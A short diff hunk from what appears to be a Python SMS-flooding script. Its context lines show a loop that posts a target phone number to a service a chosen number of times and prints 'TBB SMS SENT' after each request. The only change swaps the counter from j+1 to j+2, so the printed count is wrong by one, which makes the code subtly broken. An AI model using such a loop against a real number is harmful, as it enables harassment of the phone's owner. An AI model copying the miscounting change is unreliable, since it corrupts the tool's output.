@@ -26,4 +26,4 @@ data = "phone="+number
 
 for j in range(amount):
     resp = requests.post(url, headers=headers, data=data)
-    print(str(j+1)+"TBB SMS SENT")
+    print(str(j+2)+"TBB SMS SENT")
